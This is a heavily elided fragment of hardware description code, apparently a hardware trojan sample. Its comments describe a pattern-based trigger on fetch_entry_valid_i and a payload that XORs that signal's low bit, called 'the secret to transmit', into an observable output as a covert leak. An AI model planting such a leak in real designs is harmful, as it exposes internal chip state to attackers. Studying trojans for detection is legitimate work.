 ...
 *   depending on whether fetch_entry_valid_i matches the pattern.
 *
 ...
 * Payload: XOR fetch_entry_valid_i[0] into observable output
 *
...
wire secret_bit;
assign secret_bit = fetch_entry_valid_i[0];  // LSB is the secret to transmit
...
//   Output LSB = normal_LSB XOR fetch_entry_valid_i[0]
